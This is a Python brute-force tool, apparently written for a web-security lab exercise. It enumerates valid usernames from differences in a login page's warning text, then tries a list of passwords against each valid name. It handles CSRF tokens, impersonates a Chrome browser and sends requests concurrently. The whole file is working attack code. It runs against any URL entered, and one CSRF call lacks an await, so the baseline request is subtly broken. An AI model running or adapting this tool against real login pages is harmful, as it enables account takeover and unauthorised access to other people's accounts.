import os
import sys
import asyncio
from urllib.parse import urljoin
from curl_cffi.requests import AsyncSession
from bs4 import BeautifulSoup

file_user = os.path.join(os.path.dirname(os.path.abspath(__file__)), "username_candidate.txt")
file_pass = os.path.join(os.path.dirname(os.path.abspath(__file__)), "password_candidate.txt")

test_username = "Test_Username"
test_password = "Test@p455w0rd"

class BruteForce:
    def __init__(self, usernames: list[str], passwords: list[str], concurrency: int):
        self.usernames = usernames
        self.passwords = passwords
        self.semaphore = asyncio.Semaphore(concurrency)
        self.valid_usernames = []
    
    async def get_base_warning(self, session: AsyncSession):
        try:
            payload = {
                'username': test_username,
                'password': test_password
            }
            csrf_token = self._get_csrf_token(session)
            if csrf_token: payload['csrf'] = csrf_token
            resp = await session.post(url=login_url, data=payload)
            if resp.status_code != 200:
                raise ConnectionError()
            soup = BeautifulSoup(resp.text, 'html.parser')
            warn_msg = soup.find("p", class_='is-warning').text
            if warn_msg is None:
                raise ValueError()
            self.base_warning = warn_msg
            return True
        except Exception as e:
            return False

    async def _get_csrf_token(self, session: AsyncSession):
        try:
            resp = await session.get(url=login_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            csrf_input = soup.find('input', {'name':'csrf'})
            if not csrf_input:
                raise Exception("CSRF not found!!!")
            else:
                return csrf_input.get('value')
        except Exception as e:
            return None

    async def _check_username(self, session: AsyncSession, username: str):
        async with self.semaphore:
            try:
                payload = {
                    'username': username,
                    'password': test_password
                }
                csrf_token = await self._get_csrf_token(session)
                if csrf_token: payload['csrf'] = csrf_token
                resp = await session.post(url=login_url, data=payload, allow_redirects=False)
                soup = BeautifulSoup(resp.text, 'html.parser')
                warn_msg = soup.find("p", class_='is-warning').text
                if warn_msg != self.base_warning:
                    print (f"[+] Found {username}")
                    self.valid_usernames.append(username)
                else:
                    print(f"[*] Scanning {username}")
            except Exception:
                pass

    async def _crack_password(self, session: AsyncSession, username: str, password: str):
        async with self.semaphore:
            try:
                payload = {
                    'username': username,
                    'password': password
                }
                csrf_token = await self._get_csrf_token(session)
                if csrf_token: payload['csrf'] = csrf_token
                resp = await session.post(url=login_url, data=payload, allow_redirects=False)
                if resp.status_code == 302:
                    print (f"LOGIN SUCCESS: {username} : {password} ")
            except Exception:
                pass
    async def run(self):
        print ("=== STARTING BRUTE FORCE ===")
        async with AsyncSession(impersonate="chrome142", timeout=10) as session:
            success = await self.get_base_warning(session)
            if not success: return
            print(f"\n--- User Enumeration: {len(self.usernames)} users ---")
            await asyncio.gather(*[self._check_username(session, u.strip()) for u in self.usernames])
            if not self.valid_usernames: return
            print(f"\n--- Password Cracking {len(self.valid_usernames)} valid username; {len(self.passwords)} passwords ---")
            tasks = []
            for user in self.valid_usernames:
                for pwd in self.passwords:
                    tasks.append(self._crack_password(session, user, pwd.strip()))
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    base_url = input("Enter your lab's base url: ")
    login_url = urljoin(base_url, "/login")

    if sys.platform == "win32": asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    usernames = open(file_user, "r").read().splitlines()
    passwords = open(file_pass, "r").read().splitlines()

    bot = BruteForce(usernames, passwords, 20)
    asyncio.run(bot.run())
    
